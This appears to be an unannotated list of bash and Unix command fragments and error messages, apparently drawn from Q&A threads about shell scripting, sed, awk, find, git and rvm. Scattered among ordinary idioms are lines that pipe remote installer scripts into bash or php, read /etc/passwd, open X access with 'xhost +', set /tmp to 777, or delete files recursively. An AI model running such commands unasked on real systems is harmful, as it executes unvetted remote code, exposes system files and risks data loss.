[[ ... ]]
(( ... ))
find .
grandParentDir=$(cd ../..; printf %s "$PWD")
grandParentDirName=$(cd ../..; basename -- "$PWD")
-execdir ..\;
bash -c
$(cd ..; basename -- "$PWD")
bash -c
realpath ../../
readlink -f ../../
cat "$1" | sort
+0n -1
-k 1n,1
-k 2n
-k 2nr
declare -A
typeset -A
typeset -A
A=$(($A + 8))
echo "A = $A";
from plumbum.cmd import ...
set ${A:-0.0.0.0}
:help modeline
:help options.txt
:help au
5 & -2
while read
for loop
bash's for loop
kill -ABRT pid
<parm1> and <parm2>
cat <log_file_path> | grep inst | sed 's/.*inst "\(.*\)".*/\1/'
syntax error: unexpected end of file
sudo pico /home/user/.bashrc
ssh user@host date
read -u3
set +B
set +o braceexpand
import subprocess
perl -d
unset PERLDB_OPTS
PERLDB_OPTS= perl -d foo.pl
ls -al
-d /path/to/Téléchargements
[: eval: unary operator expected
[ ]
[ a < b ]
expr \<
expr 2 \< 10
gnu awk
-checkend <seconds>
openssl x509
UNIX EPOCH
printf '%(dateFmt)T
declare -A Subj='([CN]="${file##*/}")'
domain name
IPv4 address
rsync -avh --link-dest=full orig/ orig_1
man rsync
rsync -avh --link-dest=../full orig/ orig_1
emacs -q
emacs -nw
emacs -nw
bash: _powerline_prompt: command not found
emacs -q
emacs -nw
echo -n
echo "$val" >> file.log
kill -15 -$pid
kill -15 -$pid
java $JAVA_OPTS -cp $SOAPUI_CLASSPATH com.eviware.soapui.tools.SoapUITestCaseRunner "$@"
[ERROR] Caused by: java.lang.ClassNotFoundException: com.eviware.soapui.tools.SoapUITestCaseRunner
cd ~
echo ~
sort -k 1,1
sort -k 1,2
man sort
-k 1,2
ps -aux
./script root
-perm g+x
man bash
zenity --editable
sed -i
git checkout -b
-X theirs
git stash
No local changes to save
git checkout -b
git push
| cat
-rm /tmp/blah*
man terminfo
tput kcub1
somecommand arg1 arg2 > /dev/null
somecommand arg1 arg1 > /dev/null 2>&1
rm /home/whatever
do you really want to delete
rm whatever &> /dev/null
if ((flag))
if $found_trigger; then
if ! $found_trigger; then
if long_running_command | grep trigger_word; then
if [ $? -ne 0 ]; then
(( ... ))
man bash
set -o pipefail
set +o pipefail
LOAD DATA
mysqlimport --replace
ps | grep android.process.acore
adb shell
/system/bin/sh: sed: not found
/system/bin/sh: awk: not found
ps | grep android.process.acore
adb shell
adb shell
adb shell
ps -A | grep "android.process.acore"
heroku run
while read line
df -h
wc -l
/driving to/ s/.*'([^']+)'.*:(.*)>/\2\n\t\1/p
/no car could be found/ s/.*'([^']+)'.*/ Not Found\n\t\1/p
Mac OSX 10.9.1
Ubuntu Linux (Version Unknown)
jar xf
jar xvf
created: /
-x /
curl -O https://dl.dropboxusercontent.com/s/file.ext
cat file | cut -d ' ' -f1,2,4
awk '{print $1, $2, $4;}' file
IFS=$' \n\t'
tr -s ' '
cut -d "-" -f2
cut -d '-' -f 2-
find ./J0902-405/*.evt -maxdepth 1 -type f | split -l999 -
-name ...
-printf '%f\n'
-l 999
-a {length}
pdftk *.pdf cat output combFile.pdf
/bin/bash: pdftk: command not found
Mac OSX 10.9.1
Matlab 2013b
which pdftk
{ ... }
tee logfile
man bash
sudo dtruss -t fork -f -p {pidOfShell1}
: | :
$(: | :)
: | :; :
$(: | :; :)
[[ ... ]]
bash 4.2+
<(exec ...)
\curl -sSL https://get.rvm.io | bash -s stable --rails
rvm reinstall ruby-2.1.0
gem install rails
rm -rf
ls -l
ll /proc/31353/fd
hexdump -C
hostname --all-ip-addresses
hostname -I
ip route
ip route
ifconfig eth0
Hostname -I
ip route get [host]
tr -s ' '
cut -d' ' -f7
ip route ...
ip route ...
xargs --show-limits
expr $(getconf ARG_MAX) - $(env|wc -c) - $(env|wc -l) \* 4 - 2048
get-iplayer --get
stty cbreak
nmap command
mkcd: Command not found
source ~/.bashrc
Badly placed ()'s.
source ~/.bashrc
function mkcd { ...; }
mkcd() { ...; }
mkdir -p
type mkcd
mkcd is a function
ps -p $$
source ~/.bashrc
$(( ))
--filter='dir-merge /.rsync-filter'
repl[line1] = replacement
if ($NF in repl) $NF = repl[$NF]; print
<(echo "$list")
Syntax error: Unterminated quoted string
--pre --no-ri --no-rdoc
echo *
git add *
git add .
git add *
git add *
git add .
echo *
echo .[!.]*
git add
cat links.txt
_values cat .test_tasks~
_values:compvalues:10: invalid value definition: 1test[1
touch geese
find -cond1 -o -cond2 -cond3
cond1 OR (cond2 AND cond3)
(cond1 OR cond2) AND cond3
echo test
"echo" "test"
cmd //c echo test
cmd "/c echo test"
cmd '/c echo test'
"/c echo test"
cmd "/c echo test"
cmd "/c echo" test
cmd /c echo" test
/c echo
echo" test
cmd "/c echo "test
cmd "/c echo" test
cmd /c echo" test
right text
right text
$(tput cols)
$(($(tput cols)-20))
\d \t
$(tput cub 19)
gsub(/[^a-z]]*/, " ")
" "
rvm use
rvm ... do ...
echo "?"
echo \?
[2014-01-26 00:16:54.244][VendorProductFileProcessor-process-1][WARN]    [VendorProductFileTranslatorTask:210] Failed to process vendor data: {INTERNALCASHBACKSNAPDEALSPONSOREDPERCENTAGE=#REF!, VENDOR CODE=#REF!, INTERNALCASHBACKENDDATE=#REF!, INTERNALCASHBACKTYPEVALUE=#REF!, EXTERNALCASHBACKSTARTDATE=#REF!, SKU=#REF!, EXTERNALCASHBACKTYPEVALUE=#REF!, EXTERNALCASHBACKENDDATE=#REF!, EXTERNALCASHBACKTYPE=#REF!, EXTERNALCASHBACKSNAPDEALSPONSOREDPERCENTAGE=#REF!, INTERNALCASHBACKSTARTDATE=#REF!, INTERNALCASHBACKTYPE=#REF!}, com.snapdeal.coms.exception.RuntimeErrorException: COMS-1113: Failed to translate attribute : intCashbackTotalValue value: Unparseable number: "#REF!"
grep Exception coms-core.log | gawk -F '[' '{ if ($2 ~ \2014-01-26 00:[0-59]:[0-59]\)print $2}'
man 8 sudo
/usr/local/bin/node ~/some_folder/xml2js.js
node: command not found
while true: do
<(some command)
exec <6 /foo/bar
read line <&6
sed -e '$i Deny from 192.168.0.1' .htaccess
sed -e '/^<\/Directive_1>$/i Deny from 192.168.0.1' .htaccess
Deny from 127.0.0.1
head -n -1
tail -n 1
() >
mv -b
ls [!bar_]*
grep -v
grep -o '^[^ ]*'
rails server
rails server
rails s
=> Ctrl-C to shutdown server
rails server
rails s
Ctrl + C
Ctrl + Shift + T
%%Title: GMT v5.1.1_r12693 [64-bit] Document from pscoast
bash myscript.sh
set -o
set -o braceexpand
CTRL-X RET
launchctl load ~/Library/LaunchAgents/example.plist
find -exec
find -exec … +
find -exec … \;
find -exec … \;
xargs -0 -I{} ffmpeg …
[; too many arguments
[[ and ]]
[ "$VARIABLE" == *list of attached* ]
eval TLEN=\${#$1}
yum update memcached
aptitude show memcached
aptitude show memcached
Port Binding Offset
echo "${TEST[1]}"
echo "${TEST[0]}"
port already taken
ps aux| grep python
trailing space
yolk -U | awk '{print $1}'
alias pipup
{"'cmd "}
initctl reload ntpd
kill -9
tail -n 2
tail -1
./configure --prefix=.
which cc
hg status
hg status
git status
git remote
grep -w
grep -P '(^|\s)\Kbc(?=$|\s)' file
lsb_release -r | cut -f2
apache2ctl graceful-stop
service apache2 graceful-stop
service apache2 stop
< <(...)
while read
while read
$($MYSQLCONNECT --batch -N -e "$QUERY")
while read
git tag -l
sort -V
sort -s -t- -k 2,2n |  sort -t. -s -k 1,1n -k 2,2n -k 3,3n -k 4,4n
git describe --tags
git describe --tags
sort -s -t- -k 2,2nr |  sort -t. -s -k 1,1nr -k 2,2nr -k 3,3nr -k 4,4nr
chmod +x
git tag
$ man git-tag
brew install coreutils
gsort --version
ul > li > a
), and I need it to output into
, which will get pulled into a Jekyll layout file that wraps around my
file and generates
tree -H . -o _includes/site-index.html
-T title
env EDITOR=nano crontab -e
1 * * * * /Volumes/raid/farm_script/_apps/_scripts/farm_ping.sh
OLDIP=ifconfig eth0 | sed ... Inet ... #come with your SED statement
> commandnames.txt
> commandnames.txt
> outfile
< commandnames.txt
> commandnames.txt
while read -r name rest
cd misc; vim/update.sh
cd misc/vim; ./update.sh
var=( values )
var=( $(command output) )
grep | awk
insert or ignore
Error: no such table: s1.table
sqlite3 database.db < commands.txt
read -d $'\0'
:verbose set shell?
:set shell=/bin/bash
man test
$1~d {print $2}
d=$(date +%Y-%m-%d)
echo $our_text
rm -rf dir
composer install
composer install
find / -type f -name android
$execute_android update project --path /bla/bla
teste.sh: [: missing ']'
source script2
crontab -e
xhost +
2> /dev/null
|| true
set -e
SELECT count(1) FROM netpoints WHERE <suppressed>;
cat /proc/<PID>/status
chmod +x awko
awko file1 file2
sort -k4,4 -t"|" file1 > file1.sorted
awko file1.sorted file2.sorted
'put your unique phrase here'
echo "$location" | cat -v
tr -d '\r'
$a = $f
|| [ "${a}" = "9.3" ]
/a/b/c/d 9.3
9.3: command not found
echo "$q"
/a/b/d 9.3
awk -v "row=2" -F'@' 'NR == row { print $2 }' some.csv
-v value=$value -v row=$row -v col=$col
NR==row {$col=value}
{print $0}
exit 0
exit 0
[^ ]
sed -re
make sleep
universal-install curl
gcc program1.c program2.c -lm -o yourProgram
IP; otherstuff
f1['NTGSPYE'] = '0.156348 216185 338 NTGSPYE'
-o 1.1 1.4 2.1
[: too many arguments
exec 2> /tmp/my.log
echo "before mkdir" 1>&2
status 500
mget *.ls
ls -l
ls -l
ls -l
echo -e "colours..."
. ~/.bashrc
lls /some/path
ls (OPTIONS...)
ls -l
str1,str2....Index is 0
apple,banana....Index is 3
switch case
36 138
<ip>: stty: standard input: Invalid argument
ssh -t
dos2unix yourscript
elif [ stat --printf=%s $PLAINFILE -gt $MIN_SIZE ];
[ 123 -gt ]
-printf %P
CREATE TABLE test (column_a varchar(100)) charset=utf8
"You should enable JavaScript to login or register"
<input type="hidden" name="<hex-coded-value>" value="1" />
head -1
wget http://mywebsite.com/dump.php
curl http://mywebsite.com/dump.php
rsync -essh --delete --stats -zav username@mywebsite.com:/path/to/files/ /path/to/local/backup
cd /path/to/local/backup; tar cvf /path/to/archives/website-$(date +%Y-%m-%d).tgz *
find /path/to/archives -mtime +120 -type f -exec rm -f '{}' \;
man bash
Special Parameters
man bash
HISTORY EXPANSION
man bash
set -o history
set -o histexpand
pwd; ls
somecommand; mktmpd
echo "found something"
grep ~/Documents/myFile searchString
grep searchString ~/Documents/myFile
!:0 !:2 !:1
/tmp/vagrant-shell: line 15: [-d: command not found
TERM == xterm-256color
tmux attach
:he tabedit
./vim_tabs.sh "$(ls *.h)"
[ ! -f index.html ]
[ $? -ne 0 ]
[ ! -f index.html ]
! -f index.html
rsync -varz --no-perms --exclude-from=/path/to/exclude_file --log-file=/path/to/rsync_logs
find /mnt/data/ -maxdepth 2 -mindepth 1 -type d -printf '%f\n' > data.txt
find /mnt/backup/ -maxdepth 2 -mindepth 1 -type d -printf '%f\n' > backup.txt
rm -f
sed -i
sed -i.bak myfile
sed -i .bak myfile
sed -i ''
a, b, c, admin
sudo -c 'su - admin'
test -s
wc -l
< <(find ...)
cp -t
grep -r
find + egrep + xargs
bash yourscript.sh
for loop
[js; rename()]
$(seq 1 $N)
shopt -s extglob
plink.exe -P PORT_NUM -v USERNAME@HOST_IP -pw PASSWD "COMMAND >/dev/null &"
> /dev/null
find -f -delete /path/to/dir/*
head -100
initial_date (format %m%d%Y)
echo "filename${var}_something.txt"
split -b
mbuffer -s 8192
uname -a
Linux hostname 2.6.32-431.1.2.0.1.el6.x86_64 #1 SMP Fri Dec 13 13:06:13 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
which bash
function foo() { ..; }
foo() { ..; }
[[ ]]
[ ]
find /mnt/md0/capture/DCN/ -maxdepth 1 -type f  -name "*.pcap" -print0 | xargs -0 ls -lt | tail -$del | awk '{print $8}'
find . -type f -delete
--old-line-format=%L --new-line-format=%L --unchanged-line-format=
ls ...etc
xargs echo
ps -ef
man pgrep
--cookie-jar <file name>
--output <file>
tee stderr.txt >&2
" b "
"blades are down"
heroku run bash
heroku run bash
heroku run bash
heroku run bash
cat filename
put filename.csv
heroku run bash
base64 <your-file>
pbpaste | base64 --decode -o <your-file>
heroku ps:copy
heroku run
scp -P PORT tmp/some.log user@host:/path/some.heroku.log
heroku ps:copy <filename>
password: "secret"
/^password: /
^password: "(.*)"$
/^password: /
s#^password: "(.*)"$#\1#p
password: "secret"
wget https://host:port/URL
wget --no-check-certificate https://host:port/URL
echo $(Path)
initctl stop node-App
initctl: Unknown instance:
cd $1 && pwd
readlink -f $1
readlink -m $1
declare -a
find / -name blahblah
/tmp, /var, /sbin, /user
unmount - find
iptables -I INPUT -s xxx.xxx.xxx.xxx -j DROP
"client "
eq 0
echo filename(1:10)
cat /dev/random
cat /dev/stdin
s/^/    /p
char *argv[]
cd (change directory)
cd /home/
lsnrctl status
ssh -L 1234:127.0.0.1:1521 -l user 172.30.32.222
echo Continue
echo Continue; sleep 1; ls /tmp/server-msg.txt
ls: cannot access /tmp/server-output.txt: No such file or directory
Server is active
grep -q
return 0
echo %HOME%
HOME = %USERPROFILE%
ssh -t hostname bash -li
wobble parameters
, as it is easier to nest and also
./cygdrive/c/Program\ Files/MGLTools-1.5.6/Lib/site-packages/AutoDockTools/Utilities24/prepare_receptor4.py
Not a directory
sudo crontab -e
sudo crontab -e
|| true
man logrotate
|| true
http reload
man bash
command1 || command2
man true
command1 || true
--map_metadata 0:s:0
--map_metadata:s:a 0:s:0
shopt -s expand_aliases
rm -i
mv -i
some_command 3
some_command 15
cat myfile
sed -i
sed -n
make install
source /home/user/env.sh
echo $BIN
make install
cp filetobeinstalled
make install
cp filetobeinstalled /home/user/stuff
make var=whatever printvar
make -np install | fgrep -w BIN
echo "$(echo foo)" > file
echo '$(echo foo)' > file
Head northwest
s/ "//g
.  The dot character has the special meaning of "any character at all".  The star character means zero or more of the preceding character.  Thus the regular expression
sort -k 1,2 test.txt
set -o histexpand
set -o posix
echo "#!/"
!/: event not found
set -o histexpand
set -o posix
set -o posix
Change the behavior of Bash where the default operation differs from the POSIX standard ... This is intended to make Bash behave as a strict superset of that standard.
bash --noprofile --norc --posix
man bash
There are 4 detectors
^ (.*) $
rename --prepend S01E *.mkv
echo "$f"
echo $f
sh provision.sh
ln: /Users/<user>/symlinked.txt: No such file or directory
-type f
-maxdepth 1
sh name-of-script.sh >> /cron.log 2>&1
date -u
chsh -s /bin/rbash [username]
chmod 755 /home/[username]
rm /home/[username]/.bashrc
alias alias="printf ''"
alias vi="vi -Z"
chown root:root /home/[username]/.bash_profile
chmod 755 /home/[username/.bash_profile]
foo b[TAB]
brew install bash-completion
find: command not found
date: command not found
man gitcredentials
find ... -maxdepth 1
cp -nv
bash 4.2
a href
man wget
gem -v
rvm doctor
PATH is not properly set up, '/Users/cusxio/.rvm/gems/ruby-2.1.0/bin
rvm reload
ls | grep -v "[0-9]"
awk > $f
samtools | awk
sed "s/|/\t| /"
echo -ne 'some data' | nc -u 192.168.0.xyz 9760
nc -ul 9761
'dbhost' =>
$(./tool < input.data > output.another_data 2>&1 | tee errors.txt)
head -4
bash -e echo
/bin/echo: /bin/echo: cannot execute binary file
bash -e <script to run>
STATUS column
-name and -path
(( and ))
\copy text_files (file_content) from /home/test.txt
try catch
customise.pl name.ext name.new.psl
4.3.42(5)-release (x86_64-pc-msys)
D:\Program Files (x86)\LibreOffice 4\program\scalc.exe" "C:\Users\Adam\Desktop\Untitled.ods".
eval `ssh-agent -s`
ssh-agent -s
git@xyz.com $
chsh git -s /bin/bash
cat "/etc/passwd" > OUTPUT
read -ra ADDR <<< "cat /etc/passwd"
OUTPUT=$(cat /etc/passwd)
Jan  31 13:13:02
grep -c "data_to_find"
grep -c
Jan  31 13:13:02
sed -n '$ ='
eval $RESP
sed -n Np filename
dynamic variables
dynamic variables
man paste
elif [ "$cont" == "1"" ]; then
bash: [: missing ']'
set -x
ps -ef
shopt -s nocasematch
<?xml version="1.0" encoding="UTF-8"?><a b="" />
GNU sed 4.2.1
sudo nohup
nohup sudo
disown %1
disown 2458
shopt -s dotglob
ls -l
while read
ls -la
print $NF
grep -Po
find /path/to/working/directory -maxdepth 0 -not -path "*Docs*" -not -path "*Downloads* -name "*.txt" >list
rm "$file"
echo rm "$file"
cat test | ./bash_script
wc -w
./bash_script.sh $(cat file)
wc -w *.md | grep total | awk '{print $1}'
wc -w
gnu sed
/  /
if( (i + 1) % 2 == 0)
if( (i + 1) % 100 == 0 )
/^hello /
Building <xxxxxx>...
man screen
man bash
$(( 1 + 1 ))
$(( $(date +%s)+240 ))
cat "$@"
for .. in ..
for (( expr1 ; expr2 ; expr3 ))
/path/to/old/ld "$ARGS"
/path/to/old/ld $ARGS
man bash
${$(date)// /_}
wgrib2 $filename -spread $time.txt
# change pwd hook
find /Folder -ctime +30 -path './ExcludedSubfolder' -prune -o -name '*.*' -print
find /Folder -ctime +30 -path './ExcludedSubfolder' -prune -o -name '*.*' -exec rm {} \; > deleted.txt
! screen -list | grep -q "mc"
screen -list
which screen
foreman run
sudo yum install ncurses-devel*
unset ar[$x]
ar=( "${ar[@]:$N}" )
sub("  ", "")
ls *.txt
< 0
/bin/ls -ld /tmp
chmod 777 /tmp
grep -P (PCRE)
20140226, 20140227, 20140228, 20140301, 20140302, 20140303
"<span class='A'> blah </span>"
"<span class='B'> blah </span>"
"<span class='A'> blah </span>"
** blah **
sed "s/<span class='A'>/*/g" myfile
sed "s/<\span>/*/g" myfile
sed s/<span class='A'>[^<]*</span>/my_replacement_character/g
file.seek(int(command.getoutput("linepos myfile.txt %i" % lastrow)))
wc -c
echo $mail
cat "$file"
echo "$mail" | /usr/bin/sendmail ...
exit 0
exit 1
grep -P
tr -d ' '
s/^ //
s [0-9.]*/ /g
s/^ *//
join -1 2 -2 2
chmod +x /usr/bin/myjavashell
chsh -s /usr/bin/myjavashell youruser
extended globbing
sar -n DEV 1 1 | awk '/Average.*en0/ {print $4/1000, $6/1024}'
echo ${arr[@]}
bad substitution
if __name__ == '__main__':
msg.attach(make_attachment('result.log', filename))
c[rome]=new bie
$ ls -a
$ ls
$ ls -a
declare -f
declare -f showtxt
declare -f
i want to extract all those records where 10-12 position 111 and 21 to 23rd position 776 is there.
crontab -e
find location_to_find_from arguments....
find file1 file2 file3 etc etc
find . -name "*.dat" -type f -cmin +60 -exec basename {} \;
-maxdepth 1
vim +BundleInstall
:echo $DROPBOX
:echo isdirectory("$DROPBOX/")
:echo isdirectory("/Users/markmcdonnell/Dropbox/")
:echo $DROPBOX
isdirectory("$DROPBOX/Fresh Install/Shell/vim")
/Fresh Install/
:echo expand('%:p:h')
/Users/markmcdonnell/Dropbox/Fresh Install/Shell
Only one file name allowed: source /Users/markmcdonnell/Dropbox/Fresh Install/Shell/vim/1.settings.vim
execute 'source ' . "file"
execute 'source ' . "$file"
execute "source $file"
:verbose set rtp?
~/Dropbox/Fresh Install/Shell/vim/
~/Dropbox/Fresh Install/Shell/vim/
:help load-plugins
:verbose set rtp?
:help load-plugins
71: ~/Dropbox/Fresh Install/Shell/.vim/plugin/BufOnly.vim
~/Dropbox/Fresh Install/Shell/.vim/
chown root file.sh; chmod 0711 file.sh
wc -l
pull_data $a $b | sed 's/, \+\| \+,/g'
pull_data $a $b | sed 's/, \+\| \+,/g' > out
find /dir -maxdepth 1 -type d -printf %f
find -exec
source path/to/file.sql
UTF8 table
set names "latin1"
SET NAMES 'utf8'
sys.stdout.write("%d/100\n" % progress)
sys.stdout.write("%d/100" % progress)
bash /home/pi/logon.sh
sleep 120
su - pi -c "bash /home/pi/logon.sh &"
ls /sys/bus/usb/drivers
btusb  ftdi_sio  hub  usb  usbfs  usbhid  usbserial_generic  uvcvideo
ls /sys/bus/usb/drivers/ftdi_sio/
1-4:1.0  bind  module  uevent  unbind
echo -n "1-4:1.0" > /sys/bus/usb/drivers/ftdi_sio/unbind
echo -n "1-4:1.0" > /sys/bus/usb/drivers/ftdi_sio/bind
echo -n "1-4:1.0" > /sys/bus/usb/drivers/ftdi_sio/unbind ; echo -n "1-4:1.0" > /sys/bus/usb/drivers/ftdi_sio/bind
scale=1; ${i}/10
scale=1; ${i}/10
echo "scale=1; ${i}/10" | bc
"ab 1 abc x1"
grep -E
cat >>
-d _
-f 1
-maxdepth 1
rm -rf !(cookbooks)
shopt -s extglob
-path SomePath
pavel@host's password:
Enter passphrase for key '/home/pavel/.ssh/id_rsa':
tail -n 4
tail -n 4 *log
tail -n 4
echo $FILES
echo $FILES
echo "$FILES"
git commit --amend
TFS every where
tf checkout <filename>
tf status
scanf("%f", &var)
scanf("%f ", &var)
man bash
todo.sh alimentar o cachorro
alimentar o cachorro
alime tar o cachorro
alime tar
command substitution
process substitution
"--post-install {SCRIPT_NAME}"
bash my_python_script.py
%post -p /usr/bin/perl
cat <<'END'
time -v
/usr/bin/time -l
ms_print `ls -r massif.out.* | head -1`
env 'a.b.c=xyz'
inotifywait -m /tmp
for ep in {001..440}
find -printf '%P\n'
find *
-printf '%P\n'
whereis PHP
echo $PATH
grep -o '^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /etc/raddb/server
awk '/pattern/{printf "%s",$0;next}1' file
:set list
{print $0}
awk '$3 != $4'
awk '$3 != $4 {print $0}'
HTTP/1.1 200 OK
HTTP/1.1 404 Not Found
LANG=C ls
LC_COLLATE=C ls
var_a=C ls
${string%?} = anyanyana
${string#${string%?}} = ${string#anyanyana} = y
exec bash
alias foo='echo foo'
source myfile.txt
wc -w
sudo build_all.sh -vmware yes|no nic bridged|host_only -ipaddress xx.xx.xx.xx|dhcp -arch=ARM|x86
sudo build_all.sh
go build
go run filename.go
go build
go build
chmod a+x FILE
process | tee ...
wc -l
grep -o
-r templates/*.html
-r templates
bind -x '"\C-]":qr'
apt-get install expect
watch cat daemon.log
! -s
! -s
! -s
ServerAlias sitename.booking.local
CustomLog logs/access_$site_log combined
find -print0
ls -l
diff -c3
info bash
launchctl list
root access
rm -rf
-type d
-iname '*.bak'
rm -rf
while read
#!/usr/bin/env bash
#!/usr/bin/env bash
!# /bin/bash
/usr/bin/env bash
#! /usr/bin/env perl
#! /usr/bin/env bash
#! /bin/bash
#!/usr/bin/env bash
/bin/bash ./file.sh
/usr/bin/env bash ./file.sh
#!/usr/bin/env bash
#!/usr/bin/env -S VAR=value bash
sh script.sh yes
chmod 775 script.sh
./script.sh yes
sh script.sh
sh ...
find -print0
xargs -0
-I {}
[[ ... ]]
[ ... ]
grep --line-buffered
sed -u
sh myscript.sh 3 4
'seq -f %02.0f 1 $N'
a01b a02b a03b
awk  '{print $2}'
cut -d' ' -f2-
while true
-bash: syntax error near unexpected token '1'
sleep 1.5s
set -x
ABCD20140207090842  ABCD20140207090847  ABCD20140207090849  ABCD20140207090850 ABCD2014556644219268  ABCD20140508525691  tf
version comparison
script.sh | tee A's specified folder
true && false || true && true
column -t
awk 'NR==1{first=$1}{sum+=$1;}END{last=$1;print NR,(last-first)/1000,"L";}' yourfile
man popen
ps -www
-w              Wide output. Use this option twice for unlimited width.
ps -eF
ps -ewF
ps -f
ps -F
ps -o
ps -efHww
$1$2=="10" {for(i=12;i<=16;i++) $i="X"}
{print $0}
drush status
set -x DRUSH_PHP /Applications/MAMP/bin/php/php5.5.3/bin/php
ps aux | grep workerCallback
A 1
A 1
sed -i 's/\(10.\{0,8\}\)\.\{0,2\}\(.*\)/\1A 1\2/' FILE
A 1
A 1
A 1
A 1
grep -B XX
head -1
'/ActFlg="1"/ {print preprev}
{preprev=prev; prev=$0}
sudo mv /usr/bin/python2.6 /usr/bin/python26
module load sample_software
module load softwareX
module load softwareX
module load softwareX
script.sh: line 3L module: command not found
echo $PATH
find ... -exec curl -I {} \;
printf -v VARIABLE_NAME "whatever you need here: %s" $ID
folder-name-1.jpg ... folder-name.2.jpg
$(basename $(dirname ${FILE}))
find ... | while read f; do ffmpeg ... < /dev/null; done
!p && /pattern/
c ~ /^([578]|1[689])$/
{print; if (c==19) exit}
$(identity 'foo * bar')
set -f
find /mypath -type f -exec ruby laser-made.rb < {} \;
"RENAME redis::staging::key redis::development::key"
"RENAME redis::staging::key redis::staging::key"
echo {} $(echo {}| sed 's/old/new/')
$(echo {} |sed)
$(echo {} | sed 's/staging/development/g')
eog myimg.png; rm myimg.png
open myimg.png
/Applications/Preview.app/MacOS/Preview myimg.png
system("((" . $cmd . " 2>&1 1>&3 | tee -a stderr.log) 3>&1) > both.log; echo done | tee -a both.log"
(($command 2>&1 1>&3 | tee stderr.log) 3>&1 ) | tee both.log
make -j4
date -d
touch --date="$var"
host + F1
right ctrl + F1
for file in *
which ruby
no such file or directory
rails -v
rails -v
grep rdoctask * -r
bundle show rails
bundle exec
bundle exec
mac os x
bad substitution
man bash
exit 1
exit 127
sh test.sh
exit 1
make test
curl -sS https://getcomposer.org/installer | php
php composer.phar
mv composer.phar /usr/local/bin/composer
mv: rename composer.phar to /usr/local/bin/composer: No such file or directory
mv composer.phar /usr/local/bin
echo $PATH
space padding
sh ./configure
make tests
make install
cmd>ls {??,??_in}.pl
cmd>aa_in.pl  aa.pl  ls.pl
use strict
echo "$value"
var1="thrice once twice twice thrice";
ls -al > test.log
ssh -l someuser example.com >test.log
ssh -l >test.log 2>&1
if [ [ $ansmob = "y" ] || [ $flagbook != "1" ] ];
shuf -i
sort -n
ps ax | grep firefox
plutil -key "ID" file1.plist file2.plist file3.plist file4.plist 2>&1
line 2: [: =: unary operator expected
pacman -S
pacman -R
pacman -U
cd /path/to
sed '1d;s/^/mv /'
NR==2{t=$1;for (i=1;i<=t;i++) print l RS i> i ".txt"}
script.sh text.txt
shopt -s dotglob
A, B, C
-printf x
wc -c
head -n500
terminated by signal 13
g++ test.cpp
while [ [ $target!=T ] || [ $team!=M ] ]
if $target=T
if $target="T"
if [ $searchresult=0 ]
[ $searchresult=0 ]
Syntax error near unexpected token 'then'
man bash
[ $word = "t" (or) "I" ]
Table 7-2. Combining expressions
s/,/ /g
s/,/ /
s/,/ /g
find /home/me/downloader/0-29/ -type f | grep -i .rpm$ | xargs -i cp {} /home/me/downloader/builds/0-29/
if [ $(($1 == 1 )) ]
Syntax error near unexpected token
syntax error
cat linked.txt | python linked.py
01.xml, 02.xml, etc.
wget http://www.ofsted.gov.uk/provider/files/1295389/urn/EY298883.pdf
curl -L
gem install mechanize
if [ $? = 0 ]; then...
set -e
background process
File Tail perl module
perl logscan.pl &
./name.sh &
help test
info coreutils 'test invocation'
man test
[ something ]
[ -d "" ] && echo "yes"
nc -l
nc -l
hostname -I
ip route
ip route get
via 192.168.1.1
( ... )
nohup ( ... )
bash -c "..."
${SHELL} -c " ..."
run script.sh arg1 arg2
man test
sudo ./myfile
lftp -e ...
os.system('''awk '[...]''')
ls -al /some/path/to/where/ever/.
ls -1
rm: cannot remove ‘~/Dropbox/Shared/Alex\\&Stuff/file.zip’: No such file or directory
File has 8 title(s)
echo ""|
tr -d 'Access:'
man tr
expr index
expr index
./script.sh in
vmstat | cut -b 57-60
abe 123 bdb 532
xyz 593 iau 591
{0} or {2} to the desired field number-1
man find
screen -d -m ./script
ls * jpg |sort
mv "$fname" "$(echo "$fname" | sed -r 's/[0-9]{14}//')"
mapfile -t a_dummy <<< "$(mysql -u root –disable-column-names –silent -B -e "select * from dummy_tbl;" "$DB_NAME")
set -e
help trap
wait && echo $(date) complete.
chmod -R g-s *
cpanm Dancer Dancer::Plugin::Database (etc. etc.)
search files list
-bash: make: command not found
sudo apt-get install build-essential
{print $0}
git pull
git merge
git diff --name-only
send "$usercommand\r"
{get dump perf 0}
Don\t quote me
Don\t quote me
shopt -u xpg_echo
icpc -I/usr/include/x86_64-linux-gnu/c++/
-exec ... \;
2014/01/01 08:01
FOO=BAR command
flock -s 200
( ... )
VXLDIR = /opt
a b c
a b c n
50 * 512 bytes = 25,600 bytes
2520025 / 25600 ≈ 98 checkpoints
kill $(< ffmpeg.pid)
man [
info test
[ -d / ]
[-d /]
test EXPR
[ EXPR ]
cat file | grep pattern
'cat $TMP |grep $TXT | wc -l'
xargs -n 4
echo runcommand
cat ids.list
alias var="ls | cat"
ls | cat
Applications Documents Downloads
ls -1
execute temp
ul.tree, ul.tree ul
pkill python
pgrep -fl bz
./scriptname.sh -m|-d [-n]
./scriptname.sh -m -d
-t <argument>
Now_hourly: command not found
Now_daily: command not found
-v xinetd and nrpe
man grep
./"Artist Name"/"Album Name"/"audio files"
./"Artist name --- Album name"/"audio files"
"Artist Name"/"Album Name"
"Artist name - Album name"
ls -d
man ls
-d      Directories are listed as plain files (not searched recursively).
ls -d
ls /root
git version 1.8.3.msysgit.0
cd ${PWD}
cd .
export rvm_gemset_create_on_use_flag=1
export rvm_install_on_use_flag=1
export rvm_project_rvmrc_default=1
>, <, <=, >=
man test
(( and ))
for loop
find . -regex ".*\n.*"
\t \n \r \a
help while
help read
ps aux | grep ba[s]h
grep -oP
+ ( ...
scan: DVD has 6 title(s)
+ title 1:
+ duration: 00:43:12
unset USER
echo "---"
#!/usr/bin/env python
sh yourscript
bash yourscript
#!/usr/bin/env bash
#!/usr/bin/env yourprogram
./myscript foo bar
/usr/bin/env yourprogram myscript foo bar
mysql "$0"
-Wait -Passthrough
grep -Eo
grep -E
grep -P
return $?
$(date -d "$(date '+%d/%m/%y')" '+%s')
date +%j
awk -F: -v OFS=: '{for (i=1; i<=NF; i++) if ($i=="dog") $i="fox"} 1'
perl -F: -lane 'print join ":" , map {$_ eq "dog" ? "fox" : $_} @F'
sed -r 's/^|$/:/g; s/:dog:/:fox:/g; s/^:|:$//g;'
awk ... > tmpfile && mv tmpfile orig_file
grep -q
grep -q
var1=$(ls -l)
O(n log n)
[[ "1" != "1" ]]
while loop
ls -l | grep OWNER | find regex_for_filename | mv ../
bind -x
read x
